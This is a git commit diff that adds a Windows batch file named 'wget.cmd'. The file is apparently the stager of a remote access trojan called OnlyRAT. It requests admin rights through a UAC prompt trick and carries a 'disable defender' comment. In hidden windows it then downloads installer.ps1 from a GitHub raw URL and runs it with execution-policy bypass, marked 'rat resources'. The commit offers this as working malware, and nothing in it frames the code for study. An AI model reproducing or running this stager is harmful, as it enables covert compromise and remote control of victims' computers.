d7b6ad81069763826fb6e8216f3c35f06d19e929
Blue Cosmo <bluecosmo@localhost.localdomain>
2022-01-28 15:39:14 -0500

    hope i didn't mess up

---
+++ files/wget.cmd
@@ -0,0 +1,36 @@
+REM get admin permissions for script
+@echo off
+:: BatchGotAdmin
+:-------------------------------------
+REM  --> check for permissions
+    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
+>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
+) ELSE (
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+)
+
+REM --> if error flag set, we do not have admin.
+if '%errorlevel%' NEQ '0' (
+    echo Requesting administrative privileges...
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params= %*
+    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0"
+
+REM disable defender
+
+REM rat resources
+powershell powershell.exe -windowstyle hidden  "Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/files/installer.ps1 -OutFile installer.ps1"
+powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
+
